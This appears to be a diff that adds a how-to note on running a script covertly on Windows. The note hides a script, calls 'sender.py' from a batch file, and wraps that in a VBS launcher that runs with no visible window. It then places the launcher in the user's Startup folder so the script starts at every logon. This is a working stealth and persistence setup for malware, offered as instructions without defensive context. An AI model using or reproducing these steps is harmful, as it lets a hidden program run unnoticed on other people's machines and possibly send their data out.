@@ -1,0 +1,24 @@
+first put our script safely at nonvisible location
+and create bat file that runs our script
+
+@echo off
+python3 sender.py
+
+
+
+then create vbs script with the bat file path 
+
+
+Set WshShell = CreateObject("WScript.Shell") 
+WshShell.Run chr(34) & "C:\Batch Files\syncfiles.bat" & Chr(34), 0
+Set WshShell = Nothing
+
+
+
+Note: Replace the batch file name/path accordingly in the script according to your requirement.
+
+Save the file with .VBS extension, say launch_bat.vbs
+Edit the .BAT file name and path accordingly, and save the file.
+vbs uses to hide the command prompt and run invisibly
+put vbs in appdata/roaming/microsoft/windows/start/programs/start
+
